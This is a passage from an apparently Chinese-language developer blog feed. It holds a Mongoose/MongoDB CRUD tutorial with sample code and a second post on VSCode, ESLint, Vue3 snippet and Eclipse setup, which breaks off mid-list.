// &#x76D1;&#x542C;&#x8FDE;&#x63A5;&#x72B6;&#x6001; &#x2014;&#x2014; mongoose &#x6709;&#x4E00;&#x4E2A;&#x5C5E;&#x6027;&#x53EB;&#x505A; connection,&#x8BE5;&#x5BF9;&#x8C61;&#x8868;&#x793A;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;
var db = mongoose.connection;
db.on(&apos;error&apos;, console.error.bind(console, &apos;connection error:&apos;));
db.once(&apos;open&apos;, function() { // &#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x7684;&#x4E8B;&#x4EF6;
  // you&apos;re connected!
});
db.once(&apos;close&apos;, function() { // &#x6570;&#x636E;&#x5E93;&#x65AD;&#x5F00;&#x7684;&#x4E8B;&#x4EF6;
  // bye!
});
// &#x65AD;&#x5F00;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;(&#x4E00;&#x822C;&#x4E0D;&#x9700;&#x8981;)
mongoose.disconnect()
</code></pre>
<pre><code class="language-javascript">// &#x4F7F;&#x7528; Schema
var mongoose = require(&apos;mongoose&apos;);
mongoose.connect(&apos;mongodb://localhost:27017/mongoose_sgg&apos;);
var db = mongoose.connection;
db.on(&apos;error&apos;, console.error.bind(console, &apos;connection error:&apos;));
db.once(&apos;open&apos;, function() {
  console.log(&quot;you&apos;re connected!&quot;);
});
db.once(&apos;close&apos;, function() {
  console.log(&quot;bye!&quot;);
});
// Schema&#x662F;&#x6784;&#x9020;&#x51FD;&#x6570;
var Schema = mongoose.Schema;
var stuSchema = new Schema({ // &#x521B;&#x5EFA;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7EA6;&#x675F;
    name: String,
    age: Number,
    gender:{
        type: String, // Boolean&#x9650;&#x5236;&#x592A;&#x591A;,&#x5F00;&#x53D1;&#x4E0D;&#x5E38;&#x7528;
        default: &quot;female&quot;
    },
    address: String
})
// &#x901A;&#x8FC7; Schema &#x521B;&#x5EFA; Model &#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x96C6;&#x5408;
// mongoose.model(modelName, schema);
// &#x548C;&#x6570;&#x636E;&#x5E93;&#x7684;modelName&#x7684;&#x96C6;&#x5408;&#x6620;&#x5C04;,&#x901A;&#x8FC7;stuSchema&#x8FDB;&#x884C;&#x7EA6;&#x675F;
var StuModel = mongoose.model(&quot;student&quot;, stuSchema); // mongoose&#x4F1A;&#x81EA;&#x52A8;&#x5C06;&#x96C6;&#x5408;&#x540D;&#x53D8;&#x4E3A;&#x590D;&#x6570;
// &#x6570;&#x636E;&#x5E93;&#x63D2;&#x5165;&#x6587;&#x6863;
StuModel.create({
    name: &quot;bjj&quot;,
    age: 17,
    address: &quot;whitebonehole&quot;
}, function(err){
    if(!err){
        console.log(&quot;&#x63D2;&#x5165;&#x6210;&#x529F;&quot;);
    }
})
</code></pre>
<pre><code class="language-javascript">var mongoose = require(&apos;mongoose&apos;);
mongoose.connect(&apos;mongodb://localhost:27017/mongoose_sgg&apos;);
var db = mongoose.connection;
db.on(&apos;error&apos;, console.error.bind(console, &apos;connection error:&apos;));
db.once(&apos;open&apos;, function() {
  console.log(&quot;you&apos;re connected!&quot;);
});
db.once(&apos;close&apos;, function() {
  console.log(&quot;bye!&quot;);
});
var Schema = mongoose.Schema;
var stuSchema = new Schema({
    name: String,
    age: Number,
    gender:{
        type: String,
        default: &quot;female&quot;
    },
    address: String
})
var StuModel = mongoose.model(&quot;student&quot;, stuSchema);
// &#x6709;&#x4E86;&#x6587;&#x6863;&#x5BF9;&#x8C61;&#x5C31;&#x53EF;&#x4EE5;&#x5BF9;&#x6587;&#x6863;&#x8FDB;&#x884C;&#x589E;&#x5220;&#x6539;&#x5DEE;
// Model.create(docs,[callback])
// StuModel.create([
//     {
//         name: &quot;zbj&quot;,
//         age: 28,
//         gender: &quot;male&quot;,
//         address: &quot;gaolaozhuang&quot;
//     },
//     {
//         name: &quot;ts&quot;,
//         age: 15,
//         gender: &quot;male&quot;,
//         address: &quot;datang&quot;
//     }
// ], function(err, jellybean, snickers){ // &#x8FD4;&#x56DE;&#x6210;&#x529F;&#x72B6;&#x6001;&#x4EE5;&#x53CA;&#x63D2;&#x5165;&#x7ED3;&#x679C;
//     if(!err){
//         console.log(&quot;&#x63D2;&#x5165;&#x6210;&#x529F;&quot;);
//     }
// })
// projection-&#x6295;&#x5F71;(&#x9700;&#x8981;&#x83B7;&#x53D6;&#x7684;&#x5B57;&#x6BB5;)&#x3001;options-&#x67E5;&#x8BE2;&#x9009;&#x9879;(skip&#x3001;limit)&#x3001;callback-&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x901A;&#x8FC7;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x8FD4;&#x56DE;
// Model.find(conditions, [projection], [options], [callback]); &#x2014;&#x2014; &#x67E5;&#x8BE2;&#x7B26;&#x5408;&#x6761;&#x4EF6;&#x6587;&#x6863;,&#x603B;&#x4F1A;&#x8FD4;&#x56DE;&#x6570;&#x7EC4;
// Model.findById(conditions, [projection], [options], [callback]);
// Model.findOne(conditions, [projection], [options], [callback]);
StuModel.find({name:&quot;ts&quot;}, {name:1, _id:0, address:1}, function(err,docs){ // &#x663E;&#x793A;name&#x4E0D;&#x663E;&#x793A;_id =&gt; &#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5199;&#x5B57;&#x7B26;&#x4E32;,&#x4E0D;&#x9700;&#x8981;&#x7684;&#x524D;&#x9762;&#x52A0;&#x4E0A;-
    if(!err){
        console.log(docs); // &#x8FD4;&#x56DE;&#x7684;&#x662F;&#x6570;&#x7EC4; [ { name: &apos;ts&apos;, address: &apos;datang&apos; } ]
        console.log(docs[0].name); // ts
    }
})
StuModel.find({}, &quot;name -_id&quot;, {skip:1}, function(err,docs){ // &#x663E;&#x793A;name&#x4E0D;&#x663E;&#x793A;_id =&gt; &#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5199;&#x5B57;&#x7B26;&#x4E32;,&#x4E0D;&#x9700;&#x8981;&#x7684;&#x524D;&#x9762;&#x52A0;&#x4E0A;-
    if(!err){
        console.log(docs); // [ { name: &apos;bjj&apos; }, { name: &apos;zbj&apos; }, { name: &apos;ts&apos; } ]
    }
})
StuModel.findById(&quot;613397ae66319ccd3dbb0c05&quot;, function(err,doc){ // &#x663E;&#x793A;name&#x4E0D;&#x663E;&#x793A;_id =&gt; &#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5199;&#x5B57;&#x7B26;&#x4E32;,&#x4E0D;&#x9700;&#x8981;&#x7684;&#x524D;&#x9762;&#x52A0;&#x4E0A;-
    if(!err){
        console.log(doc); // &#x6307;&#x5B9A;_id&#x7684;&#x5BF9;&#x8C61;
    }
})
StuModel.findOne({}, &quot;name -_id&quot;, {skip:1}, function(err,doc){ // &#x663E;&#x793A;name&#x4E0D;&#x663E;&#x793A;_id =&gt; &#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5199;&#x5B57;&#x7B26;&#x4E32;,&#x4E0D;&#x9700;&#x8981;&#x7684;&#x524D;&#x9762;&#x52A0;&#x4E0A;-
    if(!err){
        console.log(doc); // { name: &apos;bjj&apos; }
        // Document&#x5BF9;&#x8C61;&#x662F;Model&#x7684;&#x5B9E;&#x4F8B;
        console.log(doc instanceof StuModel) // true
    }
})
// doc&#x4E3A;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x5BF9;&#x8C61;
// Model.update(conditions, doc, [options], [callback]);
// Model.updateMany(conditions, doc, [options], [callback]);
// Model.updateOne(conditions, doc, [options], [callback]);
// &#x4FEE;&#x6539;ts&#x5E74;&#x9F84;&#x4E3A;20
StuModel.updateOne({name: &apos;ts&apos;}, {$set:{age:20}}, function(err){
    if(!err) {
        console.log(&quot;&#x4FEE;&#x6539;&#x6210;&#x529F;&quot;);
    }
})
// Model.remove(conditions, [callback]); &#x4E00;&#x4E2A;&#x5DF2;&#x5F03;&#x7528;&#x7684;&#x51FD;&#x6570;,&#x5DF2;&#x88AB; deleteOne() &#x5220;&#x9664;&#x5355;&#x4E2A;&#x6587;&#x6863;&#x548C; deleteMany() &#x5220;&#x9664;&#x591A;&#x4E2A;&#x6587;&#x6863;&#x53D6;&#x4EE3;
// Model.deleteOne(conditions, [callback]); &#x7528;&#x4E8E;&#x5220;&#x9664;&#x5355;&#x4E2A;&#x6587;&#x6863;
// Model.deleteMany(conditions, [callback]); &#x5728;&#x5220;&#x9664;&#x540E;&#x8FD4;&#x56DE;&#x5DF2;&#x5220;&#x9664;&#x7684;&#x6587;&#x6863;&#x4EE5;&#x9632;&#x5728;&#x5220;&#x9664;&#x64CD;&#x4F5C;&#x540E;&#x9700;&#x8981;&#x5176;&#x5185;&#x5BB9;
StuModel.remove({name: &apos;zbj&apos;},function(err){
    if(!err) {
        console.log(&quot;&#x5220;&#x9664;&#x6210;&#x529F;&quot;);
    }
})
// Module.count(condition, [callback])
StuModel.count({}, function(err, count){
    if(!err){
        console.log(count); // &#x6548;&#x679C;&#x6BD4;find&#x5F97;&#x51FA;&#x6570;&#x7EC4;&#x540E;length&#x597D;,&#x4E0D;&#x5FC5;&#x67E5;&#x627E;&#x6BCF;&#x4E2A;&#x6587;&#x6863;
    }
})
</code></pre>
<pre><code class="language-javascript">var mongoose = require(&apos;mongoose&apos;);
mongoose.connect(&apos;mongodb://localhost:27017/mongoose_sgg&apos;);
var db = mongoose.connection;
db.on(&apos;error&apos;, console.error.bind(console, &apos;connection error:&apos;));
db.once(&apos;open&apos;, function() {
  console.log(&quot;you&apos;re connected!&quot;);
});
db.once(&apos;close&apos;, function() {
  console.log(&quot;bye!&quot;);
});
var Schema = mongoose.Schema;
var stuSchema = new Schema({
    name: String,
    age: Number,
    gender:{
        type: String,
        default: &quot;female&quot;
    },
    address: String
})
var StuModel = mongoose.model(&quot;student&quot;, stuSchema);
// Document&#x548C;&#x96C6;&#x5408;&#x4E2D;&#x6587;&#x6863;&#x4E00;&#x4E00;&#x5BF9;&#x5E94;,Document&#x662F;Model&#x5B9E;&#x4F8B;
// &#x901A;&#x8FC7;Model&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x90FD;&#x662F;Document
// &#x521B;&#x5EFA;&#x4E00;&#x4E2A;document
// var stu = new StuModel({
//     name:&quot;zxxz&quot;,
//     age:19,
//     gender: &quot;female&quot;,
//     address: &quot;tiangong&quot;
// });
// stu.save(function(err){
//     if(!err){
//         console.log(&quot;&#x4FDD;&#x5B58;&#x6210;&#x529F;&quot;); // Saves this document.
//     }
// })
StuModel.findOne({},function(err, doc){
    // &#x65B9;&#x5F0F;&#x4E00;
    // if(!err){
    //     // update(update,[option],[callback])
    //     doc.updateOne({$set:{age:20}},function(err){
    //         if(!err){
    //             console.log(&quot;&#x4FEE;&#x6539;&#x6210;&#x529F;&quot;);
    //         }
    //     })
    // }
    // &#x65B9;&#x5F0F;&#x4E8C;
    // doc.age = 19;
    // doc.save();
    // doc.remove(function(err) {
    //     if(!err){
    //         console.log(&quot;&#x5927;&#x5E08;&#x5144;&#x518D;&#x89C1;&quot;);
    //     }
    // })
    // get(name) &#x83B7;&#x53D6;&#x6587;&#x6863;&#x4E2D;&#x6307;&#x5B9A;&#x5C5E;&#x6027;&#x503C;
    // console.log(doc.get(&quot;name&quot;)); // &#x7B49;&#x4EF7;&#x4E8E; console.log(doc.name);
    // set(name, value) &#x8BBE;&#x7F6E;&#x6587;&#x6863;&#x6307;&#x5B9A;&#x5C5E;&#x6027;&#x503C;
    // doc.set(&quot;name&quot;,&quot;nicebjj&quot;) // &#x6570;&#x636E;&#x5E93;&#x4E0D;&#x53D8;,&#x56E0;&#x4E3A;&#x6CA1;&#x6709;&#x8C03;&#x7528;save &#x7B49;&#x4EF7;&#x4E8E; doc.name=&quot;hahaha&quot;
    // console.log(doc);
    // toJSON() &#x8F6C;&#x6362;&#x4E3A;&#x4E00;&#x4E2A;JSON&#x5BF9;&#x8C61;
    // toObject() &#x6587;&#x6863;&#x5BF9;&#x8C61;&#x8F6C;&#x5316;&#x4E3A;&#x4E00;&#x4E2A;&#x666E;&#x901A;&#x7684;js&#x5BF9;&#x8C61; &#x2014;&#x2014; &#x90E8;&#x5206;&#x65B9;&#x6CD5;&#x4F7F;&#x7528;&#x4E0D;&#x4E86;
})
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="mongodb-nodejs-driver">MongoDB NodeJS Driver</h2>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="tips">Tips</h2>
<h3 id="mongodb-%E8%87%AA%E5%A2%9E-id">MongoDB &#x81EA;&#x589E; ID</h3>
<p>MongoDB &#x6CA1;&#x6709;&#x50CF; SQL &#x4E00;&#x6837;&#x6709;&#x81EA;&#x52A8;&#x589E;&#x957F;&#x7684;&#x5C5E;&#x6027;&#xFF0C;MongoDB &#x7684; _id &#x662F;&#x7CFB;&#x7EDF;&#x81EA;&#x52A8;&#x751F;&#x6210;&#x7684; 12 &#x5B57;&#x8282;&#x552F;&#x4E00;&#x6807;&#x8BC6;&#x3002;&#x4E3A;&#x5B9E;&#x73B0; ObjectId &#x81EA;&#x52A8;&#x589E;&#x957F;&#xFF0C;&#x9700;&#x8981;&#x8F85;&#x52A9;&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x5B9E;&#x73B0;&#x3002;</p>
<ul>
<li>&#x4F7F;&#x7528;&#x6307;&#x5B9A;&#x96C6;&#x5408; =&gt; &#x4EE5; channels &#x4E3A;&#x4F8B;</li>
</ul>
<pre><code class="language-sql">db.createCollection(&quot;channels&quot;)
</code></pre>
<ul>
<li>&#x5411;&#x96C6;&#x5408;&#x4E2D;&#x63D2;&#x5165;&#x4EE5;&#x4E0B;&#x6587;&#x6863;&#xFF0C;&#x4F7F;&#x7528; cid &#x4F5C;&#x4E3A; key</li>
</ul>
<pre><code class="language-sql">db.counters.insertOne({_id:&quot;cid&quot;,&quot;sequence_value&quot;:0})
</code></pre>
<ul>
<li>&#x521B;&#x5EFA;&#x51FD;&#x6570; getNextSequenceValue &#x4F5C;&#x4E3A;&#x5E8F;&#x5217;&#x540D;&#x7684;&#x8F93;&#x5165;</li>
</ul>
<pre><code class="language-sql">function getNextSequenceValue( sequenceName ) {
  var sequenceDocument = db.counters.findAndModify(
    {
      query:{_id: sequenceName },
      update: {$inc:{sequence_value:1}},
      new:true
    });
  return sequenceDocument.sequence_value;
}
</code></pre>
<ul>
<li>&#x8C03;&#x7528; getNextSequenceValue &#x51FD;&#x6570;&#x8BBE;&#x7F6E;&#x6587;&#x6863; _id &#x81EA;&#x52A8;&#x4E3A;&#x8FD4;&#x56DE;&#x7684;&#x5E8F;&#x5217;&#x503C;</li>
</ul>
<pre><code class="language-sql">db.channels.insertOne({&quot;_id&quot;:getNextSequenceValue(&quot;cid&quot;),&quot;channels_name&quot;:&quot;&#x63A8;&#x8350;&quot;})
{ acknowledged: true, insertedId: 1 }
db.channels.insertOne({&quot;_id&quot;:getNextSequenceValue(&quot;cid&quot;),&quot;channels_name&quot;:&quot;c++&quot;})
{ acknowledged: true, insertedId: 2 }
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 &#x534F;&#x8BAE;</a> &#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;  <a href="https://blog.zairesinatra.com">zairesinatra&apos;s blog</a>&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[VSCode & Eclipse & IntelliJ]]></title><description><![CDATA[VSCode & Eclipse & IntelliJ Config Backup]]></description><link>yourdomain.com/vsc-eclipse-itj/</link><guid isPermaLink="false">60f202ed0c77773fa52cbc2c</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Thu, 22 Apr 2021 13:36:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2022/08/vscode.png" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><h2 id="vscode">VSCode</h2>
<h3 id="eslint-%E9%85%8D%E7%BD%AE">ESLint &#x914D;&#x7F6E;</h3>
<img src="yourdomain.com/content/images/2022/08/vscode.png" alt="VSCode &amp; Eclipse &amp; IntelliJ"><p>&#x901A;&#x5E38; Webpack &#x5F00;&#x53D1;&#x670D;&#x52A1;&#x5668;&#x4F1A;&#x914D;&#x5408; ESLint &#x68C0;&#x67E5;&#x4EE3;&#x7801;&#xFF0C;&#x53EF;&#x901A;&#x8FC7; Visual Studio Code &#x7684; ESLint &#x63D2;&#x4EF6;&#x914D;&#x7F6E;&#x5B8C;&#x6210;&#x4EE3;&#x7801;&#x7684;&#x81EA;&#x52A8;&#x68C0;&#x67E5;&#x4E0E;&#x4FEE;&#x6539;&#x3002;&#x56E0; ESLint &#x9700;&#x4F7F;&#x7528; .eslintrc.js &#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x5C06;&#x811A;&#x624B;&#x67B6;&#x5DE5;&#x7A0B;&#x4F5C;&#x4E3A; Visual Studio Code &#x7684;&#x6839;&#x76EE;&#x5F55;&#x3002;</p>
<p>Visual Studio Code &#x62D3;&#x5C55;&#x4E2D;&#x9009;&#x62E9; ESLint &#x63D2;&#x4EF6;&#x53F3;&#x4E0B;&#x89D2;&#x7684;&#x9F7F;&#x8F6E; =&gt; &#x70B9;&#x51FB;&#x62D3;&#x5C55;&#x8BBE;&#x7F6E;&#x540E;&#x9009;&#x62E9;&#x5DE5;&#x4F5C;&#x533A; =&gt; &#x70B9;&#x51FB;&#x53F3;&#x4E0A;&#x89D2;&#x7684;&#x6253;&#x5F00;&#x8BBE;&#x7F6E; =&gt; &#x5728; settings.json &#x4E2D;&#x8FFD;&#x52A0;&#x4EE3;&#x7801;&#x3002;</p>
<pre><code class="language-json">&quot;eslint.run&quot;: &quot;onType&quot;,
&quot;editor.codeActionsOnSave&quot;: {
  &quot;source.fixAll.eslint&quot;: true
}
</code></pre>
<h3 id="vue3-%E4%BB%A3%E7%A0%81%E6%A8%A1%E6%9D%BF">Vue3 &#x4EE3;&#x7801;&#x6A21;&#x677F;</h3>
<ul>
<li>
<p>Code =&gt; &#x9996;&#x9009;&#x9879; =&gt; &#x914D;&#x7F6E;&#x7528;&#x6237;&#x4EE3;&#x7801;&#x7247;&#x6BB5; =&gt; &#x65B0;&#x5EFA;&#x5168;&#x5C40;&#x4EE3;&#x7247;&#x6BB5;&#x6587;&#x4EF6; =&gt; &#x547D;&#x540D;</p>
</li>
<li>
<p>&#x5728;&#x65B0;&#x5EFA;&#x7684; .vue &#x7ED3;&#x5C3E;&#x6587;&#x4EF6;&#x8F93;&#x5165; vue3 &#x540E;&#xFF0C;&#x6309;&#x952E;&#x76D8;&#x7684; TAB &#x5373;&#x53EF;&#x81EA;&#x52A8;&#x751F;&#x6210;&#x6A21;&#x677F;</p>
</li>
</ul>
<pre><code class="language-json">{
  &quot;Print to console&quot;: {
    &quot;prefix&quot;: &quot;vue3ts&quot;,
    &quot;body&quot;: [
      &quot;&lt;template&gt;&quot;,
      &quot;&lt;/template&gt;&quot;,
      &quot;&quot;,
      &quot;&lt;script setup lang=&apos;ts&apos;&gt;&quot;,
      &quot;&lt;/script&gt;&quot;,
	  &quot;&quot;,
      &quot;&lt;style scoped lang=&apos;&apos;&gt;&quot;,
      &quot;&lt;/style&gt;&quot;
    ],
    &quot;description&quot;: &quot;Log output to console&quot;
  }
}
</code></pre>
<pre><code class="language-json">{
  &quot;Print to console&quot;: {
    &quot;prefix&quot;: &quot;vue3e&quot;,
    &quot;body&quot;: [
      &quot;&lt;template&gt;&quot;,
      &quot;  &lt;div&gt;&lt;/div&gt;&quot;,
      &quot;&lt;/template&gt;&quot;,
      &quot;&quot;,
      &quot;&lt;script&gt;&quot;,
      &quot;import { reactive, toRefs, onBeforeMount, onMounted } from &apos;vue&apos;&quot;,
      &quot;export default {&quot;,
      &quot;  name: &apos;&apos;,&quot;,
      &quot;  setup() {&quot;,
      &quot;    console.log(&apos;&#x521B;&#x5EFA;&#x7EC4;&#x4EF6; =&gt; setup&apos;)&quot;,
      &quot;    const data = reactive({})&quot;,
      &quot;    onBeforeMount(() =&gt; {&quot;,
      &quot;      console.log(&apos;&#x7EC4;&#x4EF6;&#x6302;&#x8F7D;&#x9875;&#x9762;&#x4E4B;&#x524D;&#x6267;&#x884C; =&gt; onBeforeMount&apos;)&quot;,
      &quot;    })&quot;,
      &quot;    onMounted(() =&gt; {&quot;,
      &quot;      console.log(&apos;&#x7EC4;&#x4EF6;&#x6302;&#x8F7D;&#x9875;&#x9762;&#x4E4B;&#x540E;&#x6267;&#x884C; =&gt; onMounted&apos;)&quot;,
      &quot;    })&quot;,
      &quot;    return {&quot;,
      &quot;      ...toRefs(data),&quot;,
      &quot;    }&quot;,
      &quot;  },&quot;,
      &quot;}&quot;,
      &quot;&quot;,
      &quot;&lt;/script&gt;&quot;,
      &quot;&quot;,
      &quot;&lt;style scoped lang=&apos;less&apos;&gt;&quot;,
      &quot;&lt;/style&gt;&quot;
    ],
    &quot;description&quot;: &quot;Log output to console&quot;
  }
}
</code></pre>
<h3 id="%E5%BF%AB%E6%8D%B7%E6%8C%87%E4%BB%A4">&#x5FEB;&#x6377;&#x6307;&#x4EE4;</h3>
<ul>
<li>&#x6574;&#x6BB5;&#x4EE3;&#x7801;&#x79FB;&#x52A8; =&gt; alt + &#x2B06;&#xFE0F; or &#x2B07;&#xFE0F;</li>
<li>&#x81EA;&#x52A8;&#x6362;&#x884C; =&gt; cmd + shift + p &#x8F93;&#x5165; settings&#xFF0C;&#x5728; defaultSettings.json &#x4E2D;&#x5C06; editor:wordWrap &#x7684; off &#x6539;&#x6210; on&#x3002;</li>
</ul>
<h3 id="enhanced-development">Enhanced development</h3>
<ul>
<li>&#x8DEF;&#x5F84;&#x522B;&#x540D; @ &#x66FF;&#x4EE3; src &#x76F8;&#x5BF9;&#x8DEF;&#x5F84; =&gt; jsconfig.json &#x9879;&#x76EE;&#x751F;&#x6548;</li>
</ul>
<pre><code class="language-json">{
  &quot;compilerOptions&quot;: {
    &quot;baseUrl&quot;: &quot;./&quot;,
    &quot;paths&quot;: {
      &quot;@/*&quot;: [&quot;src/*&quot;],
    }
  }
}
</code></pre>
<ul>
<li>.eslintignore =&gt; &#x5FFD;&#x7565;&#x88AB;&#x4ED3;&#x5E93;&#x7BA1;&#x7406;&#x7684;&#x76EE;&#x5F55; -&gt; &#x5FFD;&#x7565;&#x98CE;&#x683C;&#x6821;&#x9A8C;</li>
</ul>
<pre><code class="language-javascript">/dist
/src/vendor
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="eclipse">Eclipse</h2>
<h3 id="%E5%AE%89%E8%A3%85-eclipse">&#x5B89;&#x88C5; Eclipse</h3>
<ul>
<li>&#x786E;&#x8BA4; Mac &#x4E0A;&#x662F;&#x5426;&#x5DF2;&#x5B89;&#x88C5; java &#x8FD0;&#x884C;&#x73AF;&#x5883;</li>
</ul>
<pre><code class="language-shell">$ java -version
# java version &quot;11.0.11&quot; 2021-04-20 LTS
# Java(TM) SE Runtime Environment 18.9 (build 11.0.11+9-LTS-194)
# Java HotSpot(TM) 64-Bit Server VM 18.9 (build 11.0.11+9-LTS-194, mixed mode)
</code></pre>
<ul>
<li>&#x5B89;&#x88C5;&#x5408;&#x9002;&#x7684; Eclipse &#x7248;&#x672C;</li>
</ul>
<pre><code class="language-shell">$ brew install --cask eclipse-java
# &#x6216;&#x8005;&#x53BB;&#x5B98;&#x7F51; https://www.eclipse.org/downloads/packages/
</code></pre>
<ul>
<li>&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x540E;&#x5728;&#x5148;&#x524D;&#x6307;&#x5B9A;&#x8DEF;&#x5F84;&#x5C06; Eclipse &#x6DFB;&#x52A0;&#x5230;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;</li>
</ul>
<pre><code class="language-shell"># &#x9ED8;&#x8BA4;&#x8DEF;&#x5F84;
/Users/${zsxzy}/eclipse
</code></pre>
<h3 id="%E9%85%8D%E7%BD%AE-eclipse">&#x914D;&#x7F6E; Eclipse</h3>
<ul>
<li>Preferences =&gt; Java =&gt; installed JREs &#x914D;&#x7F6E; JDK &#xFF1A;add &#x589E;&#x52A0; Standard VM &#x7684; JRE Types&#xFF0C;&#x5E76;&#x6307;&#x5B9A; JDK &#x5B89;&#x88C5;&#x7684; Home &#x6587;&#x4EF6;&#x5939;&#x8DEF;&#x5F84;&#x3002;&#x8FD9;&#x91CC;&#x9009;&#x62E9; Standard VM &#x662F;&#x56E0;&#x4E3A; Oracle&#xFF08;&#x4EE5;&#x524D;&#x662F; Sun&#xFF09;&#x5B9E;&#x73B0;&#x7684; JRE Type &#x5411;&#x540E;&#x517C;&#x5BB9;&#x6027;&#x8F83;&#x597D;&#x3002;&#x53C2;&#x8003;&#x672C;&#x4EBA; add JRE &#x586B;&#x5199;&#x540E; Finish&#x3002;</li>
</ul>
<pre><code class="language-shell">JRE HOME: /Library/Java/JavaVirtualMachines/jdk-11.0.11.jdk/Contents/Home
JRE NAME: HOME
</code></pre>
<ul>
<li>&#x4E3A;&#x9632;&#x6B62;&#x5DE5;&#x4F5C;&#x533A;&#x6587;&#x4EF6;&#x4E71;&#x7801;&#xFF0C;&#x5728; Preference =&gt; General =&gt; workspace &#x52FE;&#x9009; Defalt(UTF-8)&#x9009;&#x9879;&#x5E76; Apply &#x3002;</li>
</ul>
<h3 id="eclipse-%E8%AE%BE%E7%BD%AE%E8%AF%AD%E8%A8%80">Eclipse &#x8BBE;&#x7F6E;&#x8BED;&#x8A00;</h3>
<ul>
<li>&#x4E2D;&#x6587;</li>
</ul>
<p>Help =&gt; Install New SoftWare &#x4E2D;&#x70B9;&#x51FB; add &#x6DFB;&#x52A0;&#x4ECE;<a href="https://www.eclipse.org/babel/downloads.php">&#x6B64;&#x94FE;&#x63A5;</a>&#x9002;&#x914D;&#x7248;&#x672C;&#x7684;&#x4E2D;&#x6587;&#x63D2;&#x4EF6;&#x5305;&#x3002;&#x8FD9;&#x91CC;&#x6CE8;&#x610F;&#x5982;&#x679C;&#x5728;&#x9009;&#x62E9; Babel Language Packs in Chinese(Simplified) &#x5168;&#x90E8;&#x5B89;&#x88C5;&#xFF0C;&#x5728;&#x672C;&#x4EBA; X86 &#x67B6;&#x6784;&#x7684; mac &#x51FA;&#x73B0; Eclipse &#x635F;&#x574F;&#x7684;&#x60C5;&#x51B5;&#xFF08;MacM1 &#x672A;&#x51FA;&#x73B0;&#x6B64;&#x635F;&#x6BC1;&#xFF09;&#x3002;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x662F;&#x4E0D;&#x9009;&#x62E9; for rt.rap &#x7684;&#x9879;&#x76EE;&#x5305;&#x3002;</p>
<p><img src="yourdomain.com/content/images/2021/09/choosezh.png" alt="VSCode &amp; Eclipse &amp; IntelliJ" loading="lazy"></p>
<ul>
<li>&#x82F1;&#x6587;</li>
</ul>
<p>&#x5728;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E2D;&#x627E;&#x5230; Eclipse&#xFF0C;&#x9009;&#x62E9; Show Package Contents&#xFF0C;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#x6253;&#x5F00;&#x5728; Contents &#x6587;&#x4EF6;&#x5939;&#x4E2D;&#x7684; Info.plist&#x3002;&#x5728;&#x5728; Eclipsekey &#x672B;&#x5C3E;&#x6DFB;&#x52A0;&#x547D;&#x4EE4;&#x884C;&#x9009;&#x9879;&#x3002;</p>
<pre><code class="language-javascript">&lt;string&gt;-nl&lt;/string&gt;&lt;string&gt;en&lt;/string&gt;
</code></pre>
<p><img src="yourdomain.com/content/images/2021/09/changebacken.png" alt="VSCode &amp; Eclipse &amp; IntelliJ" loading="lazy"></p>
<h3 id="git-version-control">Git Version Control</h3>
<ul>
<li>
<p>Help =&gt; Install New SoftWare &#x4E2D;&#x70B9;&#x51FB; add &#x6DFB;&#x52A0;&#x4ECE;<a href="http://download.eclipse.org/egit/updates/">&#x6B64;&#x94FE;&#x63A5;</a>&#x9002;&#x914D;&#x7248;&#x672C;&#x7684; EGit &#x63D2;&#x4EF6;&#x5305;&#xFF0C;&#x8F7D;&#x5165;&#x540E;&#x5168;&#x9009;&#x7EC4;&#x4EF6;&#x5E76;&#x8FDB;&#x884C;&#x5B89;&#x88C5;&#x3002;</p>
</li>
<li>
<p>&#x786E;&#x8BA4; Preference =&gt; version control =&gt; Git =&gt; config =&gt; User Settings &#x6DFB;&#x52A0;&#xFF08;&#x82E5;&#x5B89;&#x88C5;&#x8FC7; Git &#x5E76;&#x94FE;&#x63A5;&#x8FC7; Github &#x5219;&#x4F1A;&#x5B58;&#x5728;&#x5DF2;&#x81EA;&#x52A8;&#x8F7D;&#x5165;&#x5B8C;&#x6BD5;&#xFF09;&#x90AE;&#x7BB1;&#x4E0E;&#x7528;&#x6237;&#x540D;&#x3002;</p>
</li>
<li>
